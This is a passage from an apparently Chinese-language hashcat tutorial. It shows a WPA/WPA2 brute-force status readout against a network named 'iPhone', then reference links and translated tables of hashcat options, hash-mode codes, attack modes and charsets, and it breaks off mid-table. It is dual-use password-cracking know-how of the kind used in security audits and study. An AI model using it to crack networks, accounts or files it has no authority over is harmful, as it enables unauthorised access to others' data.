hashcat\nStatus...........: Running\nHash.Type........: WPA/WPA2\nHash.Target......: iPhone (74:d2:1d:ae:3f:94 <-> 88:c9:d0:b7:2c:36)\nTime.Started.....: Tue Oct 23 17:53:33 2018 (31 secs)\nTime.Estimated...: Fri Dec 24 03:40:44 2021 (200 years, 198 days)\nInput.Mask.......: ?a?a?a?a?a?a?a?a [8]\nInput.Queue......: 1/1 (100.00%)\nSpeed.Dev.#2.....:   531.0 kH/s (6.38ms)\nSpeed.Dev.#3.....:   517.3 kH/s (6.52ms)\nSpeed.Dev.#*.....:  1048.3 kH/s\nRecovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts\nProgress.........: 31854592/6634204312890625 (0.00%)\nRejected.........: 0/31854592 (0.00%)\nRestore.Point....: 0/69833729609375 (0.00%)\nCandidates.#2....: E]_LINAN -> E;$.1988\nCandidates.#3....: Narinane -> N\"XZANAN\nHWMon.Dev.#2.....: Temp: 66c Fan: 47% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16\nHWMon.Dev.#3.....: Temp: 65c Fan: 34% Util: 97% Core:1759Mhz Mem:5005Mhz Lanes:16\n```\n\n\n\n## 参考链接\n\n1. [How to build a 8 GPU password cracker](https://www.shellntel.com/blog/2017/2/8/how-to-build-a-8-gpu-password-cracker)\n2. [Running HashCat on Ubuntu 18.04 Server with 1080TI](https://www.blackhillsinfosec.com/running-hashcat-on-ubuntu-18-04-server-with-1080ti/)\n3. [How to Build a Password Cracker with NVidia GTX 1080TI & GTX 1070](https://www.blackhillsinfosec.com/build-password-cracker-nvidia-gtx-1080ti-gtx-1070/)\n4. [快速破解各种散列hash hashcat入门篇 ](https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/)\n5. [aircrack & hashcat 非字典高速破解目标无线密码](https://klionsec.github.io/2015/04/14/aircrack-hascat/)\n6. [用hashcat超速破解WiFi密码](https://bbs.ichunqiu.com/thread-21342-1-1.html)\n7. [开源GPU密码破解工具–HashCat](http://www.arkteam.net/?p=3737)\n8. [hashcat 帮助文件 中文翻译](https://www.jianshu.com/p/156e47e71b67)\n9. [Hashcat用户手册——直接攻击模式的使用](http://www.freebuf.com/column/175400.html)\n\n## 附录一\n\n### ① hashcat选项解释\n\n用法: \n\n```bash\nhashcat [选项]... hash|hash文件|hccapx文件 [字典|掩码|目录]...\n```\n\n| 选项 缩写 / 原文          | 参数类型 | 描述                                      | 用例                           |\n| ------------------------- | -------- | ----------------------------------------- | ------------------------------ |\n| -m,--hash-type            | 数字     | Hash种类，参见下面的参考                  | -m 1000                        |\n| -a,--attack-mode          | 数字     | 攻击模式，参见下面的参考                  | -a 3                           |\n| -V,--version              |          | 输出版本信息                              |                                |\n| -h,--help                 |          | 输出帮助信息                              |                                |\n| --quiet                   |          | 禁用输出                                  |                                |\n| --hex-charset             |          | 字符集以十六进制形式给出                  |                                |\n| --hex-salt                |          | 盐以十六进制形式给出                      |                                |\n| --hex-wordlist            |          | 字典中的单词是以十六进制形式给出的        |                                |\n| --force                   |          | 忽略警告                                  |                                |\n| --status                  |          | 自动更新屏幕                              |                                |\n| --status-timer            | 数字     | 设置自动更新屏幕间隔为X秒                 | --status-timer=1               |\n| --machine-readable        |          | 以机器可读格式显示状态视图                |                                |\n| --keep-guessing           |          | 被破解之后继续猜测Hash                    |                                |\n| --loopback                |          | 在induction目录中加入新的纯文本文件       |                                |\n| --weak-hash-threshold     | 数字     | 当阈值为X时停止检查弱Hash                 | --weak=0                       |\n| --markov-hcstat           | 文件     | 指定要使用的hcstat文件                    | --markov-hc=my.hcstat          |\n| --markov-disable          |          | 禁用马尔可夫链，模仿经典暴力破解          |                                |\n| --markov-classic          |          | 启用经典马尔可夫链，无任何位置            |                                |\n| -t,--markov-threshold     | 数字     | 当阈值X时停止接收新的马尔科夫链           | -t 50                          |\n| --runtime                 | 数字     | 运行X秒后中止会话                         | --runtime=10                   |\n| --session                 | 字符串   | 定义具体的会话名称                        | --session=mysession            |\n| --restore                 |          | 从--session恢复会话                       |                                |\n| --restore-disable         |          | 不写入恢复文件                            |                                |\n| --restore-file-path       | 文件     | 指定恢复文件的路径                        | --restore-file-path=my.restore |\n| -o,--outfile              | 文件     | 定义恢复的Hash的输出文件                  | -o outfile.txt                 |\n| --outfile-format          | 数字     | 定义恢复的Hash的输出格式，参见下面的参考  | --outfile-format=7             |\n| --outfile-autohex-disable |          | 在输出纯文本文件中禁用$HEX[]              |                                |\n| --outfile-check-timer     | 数字     | 设置输出文件检查间隔为X秒                 | --outfile-check=30             |\n| -p,--separator            | 字符     | Hash表和输出文件的分隔符                  | -p :                           |\n| --stdout                  |          | 不破解Hash，只打印候选值                  |                                |\n| --show                    |          | 比较Hash表和pot文件，显示已破解的Hash     |                                |\n| --left                    |          | 比较Hash表和pot文件，显示未破解的Hash     |                                |\n| --username                |          | 忽略Hash文件中的用户名                    |                                |\n| --remove                  |          | 一旦破解，就删除Hash                      |                                |\n| --remove-timer            | 数字     | 每X秒更新输入的Hash文件                   | --remove-timer=30              |\n| --potfile-disable         |          | 不写入pot文件                             |                                |\n| --potfile-path            | 目录     | 指定pot文件的路径                         | --potfile-path=my.pot          |\n| --debug-mode              | 数字     | 定义调试模式(仅通过使用规则进行混合)      | --debug-mode=4                 |\n| --debug-file              | 文件     | 调试规则的输出文件                        | --debug-file=good.log          |\n| --induction-dir           | 目录     | 指定loopback的induction目录               | --induction=inducts            |\n| --outfile-check-dir       | 目录     | 指定监控纯文本文件的输出目录              | --outfile-check-dir=x          |\n| --logfile-disable         |          | 禁用日志文件                              |                                |\n| --hccapx-message-pair     | 数字     | 只从hccapx加载匹配X的消息对               | --hccapx-message-pair=2        |\n| --nonce-error-corrections | 数字     | 用BF大小范围来取代AP最后字节的随机数      | --nonce-error-corrections=16   |\n| --truecrypt-keyfiles      | 文件     | 要使用的密匙文件，用逗号分隔              | --truecrypt-key=x.png          |\n| --veracrypt-keyfiles      | 文件     | 要使用的密匙文件，用逗号分隔              | --veracrypt-key=x.txt          |\n| --veracrypt-pim           | 数字     | VeraCrypt的头部密钥生成的迭代次数(PIM)    | --veracrypt-pim=1000           |\n| -b,--benchmark            |          | 运行基准测试                              |                                |\n| --speed-only              |          | 返回预期的攻击速度，然后退出              |                                |\n| --progress-only           |          | 返回理想进度的步骤大小和处理时间          |                                |\n| -c,--segment-size         | 数字     | 为wordfile设置 X MB缓存                   | -c 32                          |\n| --bitmap-min              | 数字     | 设置位图最小为X位(bit)                    | --bitmap-min=24                |\n| --bitmap-max              | 数字     | 设置位图最大为X位(bit)                    | --bitmap-max=24                |\n| --cpu-affinity            | 字符串   | 设置CPU相关性，用逗号分隔                 | --cpu-affinity=1,2,3           |\n| -I,--opencl-info          |          | 显示检测到的OpenCL平台/设备的信息         | -I                             |\n| --opencl-platforms        | 字符串   | 要使用的OpenCL平台，用逗号分隔            | --opencl-platforms=2           |\n| -d,--opencl-devices       | 字符串   | 要使用的OpenCL设备，用逗号分隔            | -d 1                           |\n| -D,--opencl-device-types  | 字符串   | 要使用的OpenCL设备类型，用逗号分隔        | -D 1                           |\n| --opencl-vector-width     | 数字     | 手动覆盖OpenCL矢量宽度为X                 | --opencl-vector=4              |\n| -w,--workload-profile     | 数字     | 设置工作负载配置文件，参见下面的参考      | -w 3                           |\n| -n,--kernel-accel         | 数字     | 手动调整工作负载，将外圈步长设置为X       | -n 64                          |\n| -u,--kernel-loops         | 数字     | 手动调整工作负载，将内圈步长设置为X       | -u 256                         |\n| --nvidia-spin-damp        | 数字     | 可变通NVIDIA处理器热循环Bug，用百分比表示 | --nvidia-spin-damp=50          |\n| --gpu-temp-disable        |          | 禁用GPU温度和风扇速度的读取和触发         |                                |\n| --gpu-temp-abort          | 数字     | 如果GPU温度达到X摄氏度，则中止            | --gpu-temp-abort=100           |\n| --gpu-temp-retain         | 数字     | 尝试将GPU温度保持在X摄氏度                | --gpu-temp-retain=95           |\n| --powertune-enable        |          | 启用电源调整。 完成后恢复设置             |                                |\n| --scrypt-tmto             | 数字     | 手动覆盖scrypt的TMTO值为X                 | --scrypt-tmto=3                |\n| -s,--skip                 | 数字     | 跳过前X个单词                             | -s 1000000                     |\n| -l,--limit                | 数字     | 跳过单词后限制X个单词                     | -l 1000000                     |\n| --keyspace                |          | 显示密钥空间base：mod值后退出             |                                |\n| -j,--rule-left            | 规则     | 单个规则应用于字典中左侧的每个单词        | -j 'c'                         |\n| -k,--rule-right           | 规则     | 单个规则应用于字典中右侧的每个单词        | -k '^-'                        |\n| -r,--rules-file           | 文件     | 多个规则应用于字典中的每个单词            | -r rules/best64.rule           |\n| -g,--generate-rules       | 数字     | 生成X个随机规则                           | -g 10000                       |\n| --generate-rules-func-min | 数字     | 强制每个规则最小X个函数                   |                                |\n| --generate-rules-func-max | 数字     | 强制每个规则最大X个函数                   |                                |\n| --generate-rules-seed     | 数字     | 强制RNG种子设置为X                        |                                |\n| -1,--custom-charset1      | 字符集   | 用户定义的字符集 ?1                       | -1 ?l?d?u                      |\n| -2,--custom-charset2      | 字符集   | 用户定义的字符集 ?2                       | -2 ?l?d?s                      |\n| -3,--custom-charset3      | 字符集   | 用户定义的字符集 ?3                       |                                |\n| -4,--custom-charset4      | 字符集   | 用户定义的字符集 ?4                       |                                |\n| -i,--increment            |          | 启用掩码增量模式                          |                                |\n| --increment-min           | 数字     | 在X处开始掩码递增                         | --increment-min=4              |\n| --increment-max           | 数字     | 在X处停止掩码递增                         | --increment-max=8              |\n\n### ② Hash种类\n\n| 编号  | 名称                                             | 类别                                    |\n| ----- | ------------------------------------------------ | --------------------------------------- |\n| 900   | MD4                                              | 纯Hash                                  |\n| 0     | MD5                                              | 纯Hash                                  |\n| 5100  | Half MD5                                         | 纯Hash                                  |\n| 100   | SHA1                                             | 纯Hash                                  |\n| 1300  | SHA-224                                          | 纯Hash                                  |\n| 1400  | SHA-256                                          | 纯Hash                                  |\n| 10800 | SHA-384                                          | 纯Hash                                  |\n| 1700  | SHA-512                                          | 纯Hash                                  |\n| 5000  | SHA-3 (Keccak)                                   | 纯Hash                                  |\n| 10100 | SipHash                                          | 纯Hash                                  |\n| 6000  | RIPEMD-160                                       | 纯Hash                                  |\n| 6100  | Whirlpool                                        | 纯Hash                                  |\n| 6900  | GOST R 34.11-94                                  | 纯Hash                                  |\n| 11700 | GOST R 34.11-2012 (Streebog) 256-bit             | 纯Hash                                  |\n| 11800 | GOST R 34.11-2012 (Streebog) 512-bit             | 纯Hash                                  |\n| 10    | md5($pass.$salt)                                 | 纯Hash，盐 且/或 多次迭代               |\n| 20    | md5($salt.$pass)                                 | 纯Hash，盐 且/或 多次迭代               |\n| 30    | md5(unicode($pass).$salt)                        | 纯Hash，盐 且/或 多次迭代               |\n| 40    | md5($salt.unicode($pass))                        | 纯Hash，盐 且/或 多次迭代               |\n| 3800  | md5($salt.$pass.$salt)                           | 纯Hash，盐 且/或 多次迭代               |\n| 3710  | md5($salt.md5($pass))                            | 纯Hash，盐 且/或 多次迭代               |\n| 4010  | md5($salt.md5($salt.$pass))                      | 纯Hash，盐 且/或 多次迭代               |\n| 4110  | md5($salt.md5($pass.$salt))                      | 纯Hash，盐 且/或 多次迭代               |\n| 2600  | md5(md5($pass))                                  | 纯Hash，盐 且/或 多次迭代               |\n| 3910  | md5(md5($pass).md5($salt))                       | 纯Hash，盐 且/或 多次迭代               |\n| 4300  | md5(strtoupper(md5($pass)))                      | 纯Hash，盐 且/或 多次迭代               |\n| 4400  | md5(sha1($pass))                                 | 纯Hash，盐 且/或 多次迭代               |\n| 110   | sha1($pass.$salt)                                | 纯Hash，盐 且/或 多次迭代               |\n| 120   | sha1($salt.$pass)                                | 纯Hash，盐 且/或 多次迭代               |\n| 130   | sha1(unicode($pass).$salt)                       | 纯Hash，盐 且/或 多次迭代               |\n| 140   | sha1($salt.unicode($pass))                       | 纯Hash，盐 且/或 多次迭代               |\n| 4500  | sha1(sha1($pass))                                | 纯Hash，盐 且/或 多次迭代               |\n| 4520  | sha1($salt.sha1($pass))                          | 纯Hash，盐 且/或 多次迭代               |\n| 4700  | sha1(md5($pass))                                 | 纯Hash，盐 且/或 多次迭代               |\n| 4900  | sha1($salt.$pass.$salt)                          | 纯Hash，盐 且/或 多次迭代               |\n| 14400 | sha1(CX)                                         | 纯Hash，盐 且/或 多次迭代               |\n| 1410  | sha256($pass.$salt)                              | 纯Hash，盐 且/或 多次迭代               |\n| 1420  | sha256($salt.$pass)                              | 纯Hash，盐 且/或 多次迭代               |\n| 1430  | sha256(unicode($pass).$salt)                     | 纯Hash，盐 且/或 多次迭代               |\n| 1440  | sha256($salt.unicode($pass))                     | 纯Hash，盐 且/或 多次迭代               |\n| 1710  | sha512($pass.$salt)                              | 纯Hash，盐 且/或 多次迭代               |\n| 1720  | sha512($salt.$pass)                              | 纯Hash，盐 且/或 多次迭代               |\n| 1730  | sha512(unicode($pass).$salt)                     | 纯Hash，盐 且/或 多次迭代               |\n| 1740  | sha512($salt.unicode($pass))                     | 纯Hash，盐 且/或 多次迭代               |\n| 50    | HMAC-MD5 (key = $pass)                           | 纯Hash，认证的                          |\n| 60    | HMAC-MD5 (key = $salt)                           | 纯Hash，认证的                          |\n| 150   | HMAC-SHA1 (key = $pass)                          | 纯Hash，认证的                          |\n| 160   | HMAC-SHA1 (key = $salt)                          | 纯Hash，认证的                          |\n| 1450  | HMAC-SHA256 (key = $pass)                        | 纯Hash，认证的                          |\n| 1460  | HMAC-SHA256 (key = $salt)                        | 纯Hash，认证的                          |\n| 1750  | HMAC-SHA512 (key = $pass)                        | 纯Hash，认证的                          |\n| 1760  | HMAC-SHA512 (key = $salt)                        | 纯Hash，认证的                          |\n| 14000 | DES (PT = $salt, key = $pass)                    | 纯加密，已知的明文攻击                  |\n| 14100 | 3DES (PT = $salt, key = $pass)                   | 纯加密，已知的明文攻击                  |\n| 14900 | Skip32 (PT = $salt, key = $pass)                 | 纯加密，已知的明文攻击                  |\n| 400   | phpass                                           | 通用密钥导出函数(KDF)                   |\n| 8900  | scrypt                                           | 通用密钥导出函数(KDF)                   |\n| 11900 | PBKDF2-HMAC-MD5                                  | 通用密钥导出函数(KDF)                   |\n| 12000 | PBKDF2-HMAC-SHA1                                 | 通用密钥导出函数(KDF)                   |\n| 10900 | PBKDF2-HMAC-SHA256                               | 通用密钥导出函数(KDF)                   |\n| 12100 | PBKDF2-HMAC-SHA512                               | 通用密钥导出函数(KDF)                   |\n| 23    | Skype                                            | 网络协议                                |\n| 2500  | WPA/WPA2                                         | 网络协议                                |\n| 4800  | iSCSI CHAP authentication, MD5(CHAP)             | 网络协议                                |\n| 5300  | IKE-PSK MD5                                      | 网络协议                                |\n| 5400  | IKE-PSK SHA1                                     | 网络协议                                |\n| 5500  | NetNTLMv1                                        | 网络协议                                |\n| 5500  | NetNTLMv1+ESS                                    | 网络协议                                |\n| 5600  | NetNTLMv2                                        | 网络协议                                |\n| 7300  | IPMI2 RAKP HMAC-SHA1                             | 网络协议                                |\n| 7500  | Kerberos 5 AS-REQ Pre-Auth etype 23              | 网络协议                                |\n| 8300  | DNSSEC (NSEC3)                                   | 网络协议                                |\n| 10200 | CRAM-MD5                                         | 网络协议                                |\n| 11100 | PostgreSQL CRAM (MD5)                            | 网络协议                                |\n| 11200 | MySQL CRAM (SHA1)                                | 网络协议                                |\n| 11400 | SIP digest authentication (MD5)                  | 网络协议                                |\n| 13100 | Kerberos 5 TGS-REP etype 23                      | 网络协议                                |\n| 121   | SMF (Simple Machines Forum) > v1.1               | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 400   | phpBB3 (MD5)                                     | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2611  | vBulletin < v3.8.5                               | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2711  | vBulletin >= v3.8.5                              | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2811  | MyBB 1.2+                                        | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2811  | IPB2+ (Invision Power Board)                     | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 8400  | WBB3 (Woltlab Burning Board)                     | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 11    | Joomla < 2.5.18                                  | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 400   | Joomla >= 2.5.18 (MD5)                           | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 400   | WordPress (MD5)                                  | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 2612  | PHPS                                             | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 7900  | Drupal7                                          | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 21    | osCommerce                                       | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 21    | xt:Commerce                                      | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 11000 | PrestaShop                                       | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 124   | Django (SHA-1)                                   | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 10000 | Django (PBKDF2-SHA256)                           | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 3711  | MediaWiki B type                                 | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 13900 | OpenCart                                         | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 4521  | Redmine                                          | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 4522  | PunBB                                            | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 12001 | Atlassian (PBKDF2-HMAC-SHA1)                     | 论坛，内容管理系统(CMS)，电子商务，框架 |\n| 12    | PostgreSQL                                       | 数据库服务器                            |\n| 131   | MSSQL (2000)                                     | 数据库服务器                            |\n| 132   | MSSQL (2005)                                     | 数据库服务器                            |\n| 1731  | MSSQL (2012, 2014)                               | 数据库服务器                            |\n| 200   | MySQL323                                         | 数据库服务器                            |\n| 300   | MySQL4.1/MySQL5                                  | 数据库服务器                            |\n| 3100  | Oracle H: Type (Oracle 7+)                       | 数据库服务器                            |\n| 112   | Oracle S: Type (Oracle 11+)                      | 数据库服务器                            |\n| 12300 | Oracle T: Type (Oracle 12+)                      | 数据库服务器                            |\n| 8000  | Sybase ASE                                       | 数据库服务器                            |\n| 141   | Episerver 6.x < .NET 4                           | HTTP，SMTP，LDAP服务器                  |\n| 1441  | Episerver 6.x >= .NET 4                          | HTTP，SMTP，LDAP服务器                  |\n| 1600  | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP，SMTP，LDAP服务器                  |\n| 12600 | ColdFusion 10+                                   | HTTP，SMTP，LDAP服务器                  |\n| 1421  | hMailServer                                      | HTTP，SMTP，LDAP服务器                  |\n| 101   | nsldap, SHA-1(Base64), Netscape LDAP SHA         | HTTP，SMTP，LDAP服务器                  |\n| 111   | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | HTTP，SMTP，LDAP服务器                  |\n| 1411  | SSHA-256(Base64), LDAP {SSHA256}                 | HTTP，SMTP，LDAP服务器                  |\n| 1711  | SSHA-512(Base64), LDAP {SSHA512}                 | HTTP，SMTP，LDAP服务器                  |\n| 15000 | FileZilla Server >= 0.9.55                       | FTP 服务器                              |\n| 11500 | CRC32                                            | 校验和                                  |\n| 3000  | LM                                               | 操作系统                                |\n| 1000  | NTLM                                             | 操作系统                                |\n| 1100  | Domain Cached Credentials (DCC), MS Cache        | 操作系统                                |\n| 2100  | Domain Cached Credentials 2 (DCC2), MS Cache 2   | 操作系统                                |\n| 12800 | MS-AzureSync  PBKDF2-HMAC-SHA256                 | 操作系统                                |\n| 1500  | descrypt, DES (Unix), Traditional DES            | 操作系统                                |\n| 12400 | BSDiCrypt, Extended DES                          | 操作系统                                |\n| 500   | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | 操作系统                                |\n| 3200  | bcrypt $2*$, Blowfish (Unix)                     | 操作系统                                |\n| 7400  | sha256crypt $5$, SHA256 (Unix)                   | 操作系统                                |\n| 1800  | sha512crypt $6$, SHA512 (Unix)                   | 操作系统                                |\n| 122   | OSX v10.4, OSX v10.5, OSX v10.6                  | 操作系统                                |\n| 1722  | OSX v10.7                                        | 操作系统                                |\n| 7100  | OSX v10.8+ (PBKDF2-SHA512)                       | 操作系统                                |\n| 6300  | AIX {smd5}                                       | 操作系统                                |\n| 6700  | AIX {ssha1}                                      | 操作系统                                |\n| 6400  | AIX {ssha256}                                    | 操作系统                                |\n| 6500  | AIX {ssha512}                                    | 操作系统                                |\n| 2400  | Cisco-PIX MD5                                    | 操作系统                                |\n| 2410  | Cisco-ASA MD5                                    | 操作系统                                |\n| 500   | Cisco-IOS $1$ (MD5)                              | 操作系统                                |\n| 5700  | Cisco-IOS type 4 (SHA256)                        | 操作系统                                |\n| 9200  | Cisco-IOS $8$ (PBKDF2-SHA256)                    | 操作系统                                |\n| 9300  | Cisco-IOS $9$ (scrypt)                           | 操作系统                                |\n| 22    | Juniper NetScreen/SSG (ScreenOS)                 | 操作系统                                |\n| 501   | Juniper IVE                                      | 操作系统                                |\n| 15100 | Juniper/NetBSD sha1crypt                         | 操作系统                                |\n| 7000  | FortiGate (FortiOS)                              | 操作系统                                |\n| 5800  | Samsung Android Password/PIN                     | 操作系统                                |\n| 13800 | Windows Phone 8+ PIN/password                    | 操作系统                                |\n| 8100  | Citrix NetScaler                                 | 操作系统                                |\n| 8500  | RACF                                             | 操作系统                                |\n| 7200  | GRUB 2                                           | 操作系统                                |\n| 9900  | Radmin2                                          | 操作系统                                |\n| 125   | ArubaOS                                          | 操作系统                                |\n| 7700  | SAP CODVN B (BCODE)                              | 企业应用软件（EAS）                     |\n| 7800  | SAP CODVN F/G (PASSCODE)                         | 企业应用软件（EAS）                     |\n| 10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | 企业应用软件（EAS）                     |\n| 8600  | Lotus Notes/Domino 5                             | 企业应用软件（EAS）                     |\n| 8700  | Lotus Notes/Domino 6                             | 企业应用软件（EAS）                     |\n| 9100  | Lotus Notes/Domino 8                             | 企业应用软件（EAS）                     |\n| 133   | PeopleSoft                                       | 企业应用软件（EAS）                     |\n| 13500 | PeopleSoft PS_TOKEN                              | 企业应用软件（EAS）                     |\n| 11600 | 7-Zip                                            | 压缩/存档                               |\n| 12500 | RAR3-hp                                          | 压缩/存档                               |\n| 13000 | RAR5                                             | 压缩/存档                               |\n| 13200 | AxCrypt                                          | 压缩/存档                               |\n| 13300 | AxCrypt in-memory SHA1                           | 压缩/存档                               |\n| 13600 | WinZip                                           | 压缩/存档                               |\n| 14700 | iTunes 备份 < 10.0                               | 备份                                    |\n| 14800 | iTunes 备份 >= 10.0                              | 备份                                    |\n| 62XY  | TrueCrypt                                        | 全盘加密（FDE）                         |\n| X     | 1 = PBKDF2-HMAC-RIPEMD160                        | 全盘加密（FDE）                         |\n| X     | 2 = PBKDF2-HMAC-SHA512                           | 全盘加密（FDE）                         |\n| X     | 3 = PBKDF2-HMAC-Whirlpool                        | 全盘加密（FDE）                         |\n| X     | 4 = PBKDF2-HMAC-RIPEMD160 + boot-mode            | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure AES                        | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure Serpent                    | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure Twofish                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure AES                        | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure Serpent                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure Twofish                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded AES-Twofish            | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded Serpent-AES            | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded Twofish-Serpent        | 全盘加密（FDE）                         |\n| Y     | 3 = XTS 1536 bit all                             | 全盘加密（FDE）                         |\n| 8800  | Android FDE <= 4.3                               | 全盘加密（FDE）                         |\n| 12900 | Android FDE (Samsung DEK)                        | 全盘加密（FDE）                         |\n| 12200 | eCryptfs                                         | 全盘加密（FDE）                         |\n| 137XY | VeraCrypt                                        | 全盘加密（FDE）                         |\n| X     | 1 = PBKDF2-HMAC-RIPEMD160                        | 全盘加密（FDE）                         |\n| X     | 2 = PBKDF2-HMAC-SHA512                           | 全盘加密（FDE）                         |\n| X     | 3 = PBKDF2-HMAC-Whirlpool                        | 全盘加密（FDE）                         |\n| X     | 4 = PBKDF2-HMAC-RIPEMD160 + boot-mode            | 全盘加密（FDE）                         |\n| X     | 5 = PBKDF2-HMAC-SHA256                           | 全盘加密（FDE）                         |\n| X     | 6 = PBKDF2-HMAC-SHA256 + boot-mode               | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure AES                        | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure Serpent                    | 全盘加密（FDE）                         |\n| Y     | 1 = XTS  512 bit pure Twofish                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure AES                        | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure Serpent                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit pure Twofish                    | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded AES-Twofish            | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded Serpent-AES            | 全盘加密（FDE）                         |\n| Y     | 2 = XTS 1024 bit cascaded Twofish-Serpent        | 全盘加密（FDE）                         |\n| Y     | 3 = XTS 1536 bit all                             | 全盘加密（FDE）                         |\n| 14600 | LUKS                                             | 全盘加密（FDE）                         |\n| 9700  | MS Office <= 2003 $0/$1, MD5 + RC4               | 文档                                    |\n| 9710  | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1  | 文档                                    |\n| 9720  | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2  | 文档                                    |\n| 9800  | MS Office <= 2003 $3/$4, SHA1 + RC4              | 文档                                    |\n| 9810  | MS Office <= 2003 $3/$4, SHA1 + RC4, collider #1 | 文档                                    |\n| 9820  | MS Office <= 2003 $3/$4, SHA1 + RC4, collider #2 | 文档                                    |\n| 9400  | MS Office 2007                                   | 文档                                    |\n| 9500  | MS Office 2010                                   | 文档                                    |\n| 9600  | MS Office 2013                                   | 文档                                    |\n| 10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | 文档                                    |\n| 10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | 文档                                    |\n| 10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | 文档                                    |\n| 10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | 文档                                    |\n| 10600 | PDF 1.7 Level 3 (Acrobat 9)                      | 文档                                    |\n| 10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | 文档                                    |\n| 9000  | Password Safe v2                                 | 密码管理软件                            |\n| 5200  | Password Safe v3                                 | 密码管理软件                            |\n| 6800  | LastPass + LastPass sniffed                      | 密码管理软件                            |\n| 6600  | 1Password, agilekeychain                         | 密码管理软件                            |\n| 8200  | 1Password, cloudkeychain                         | 密码管理软件                            |\n| 11300 | Bitcoin/Litecoin wallet.dat                      | 密码管理软件                            |\n| 12700 | Blockchain, My Wallet                            | 密码管理软件                            |\n| 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | 密码管理软件                            |\n| 99999 | Plaintext                                        | Blockchain明文，我的钱包                |\n\n### ③ 输出格式\n\n| 编号 | 格式                                  |\n| ---- | ------------------------------------- |\n| 1    | hash[:salt]                           |\n| 2    | plain                                 |\n| 3    | hash[:salt]:plain                     |\n| 4    | hex_plain                             |\n| 5    | hash[:salt]:hex_plain                 |\n| 6    | plain:hex_plain                       |\n| 7    | hash[:salt]:plain:hex_plain           |\n| 8    | crackpos                              |\n| 9    | hash[:salt]:crack_pos                 |\n| 10   | plain:crack_pos                       |\n| 11   | hash[:salt]:plain:crack_pos           |\n| 12   | hex_plain:crack_pos                   |\n| 13   | hash[:salt]:hex_plain:crack_pos       |\n| 14   | plain:hex_plain:crack_pos             |\n| 15   | hash[:salt]:plain:hex_plain:crack_pos |\n\n### ④ 调试模式规则\n\n| 编号 | 格式                     |\n| ---- | ------------------------ |\n| 1    | 查找规则                 |\n| 2    | 原始词                   |\n| 3    | 原始词:查找规则          |\n| 4    | 原始词:查找规则:已处理词 |\n\n### ⑤ 攻击模式\n\n| 编号 | 模式             |\n| ---- | ---------------- |\n| 0    | 直接             |\n| 1    | 组合             |\n| 3    | 暴力穷举         |\n| 6    | 混合 字典 + 掩码 |\n| 7    | 混合 掩码 + 字典 |\n\n### ⑥ 内置字符集\n\n| ?    | 字符集                       |      |\n| ---- | ---------------------------- | ---- |\n| l    | abcdefghijklmnopqrstuvwxyz   |      |\n| u    | ABCDEFGHIJKLMNOPQRSTUVWXYZ   |      |\n| d    | 0123456789                   |      |\n| h    | 0123456789abcdef             |      |\n| H    | 0123456789ABCDEF             |      |\n| s    | !\"#$%&'()*+,-./:;<=>?@[]^_`{ | }~   |\n| a    | ?l?u?d?s                     |      |\n| b    | 0x00 - 0xff                  |      |\n\n### ⑦ OpenCL设备类型\n\n| 编号 | 设备类型                                                     |\n| ---- | ------------------------------------------------------------ |\n| 1    | CPU                                                          |\n| 2    | GPU                                                          |\n| 3    | 现场可编程门阵列(FPGA)，数字信号处理器(DSP)，协处理器(Co-Processor) |\n\n### ⑧ 工作负载配置文件\n\n| 编号 | 性能 | 运行时间 | 能量消耗 | 桌面影响 |\n| ---- | ---- | -------- | -------- | -------- |\n| 1    | 低   | 2 ms     | 低       | 最小     |\n| 2    | 默认 | 12 ms    | 经济型   | 可察觉   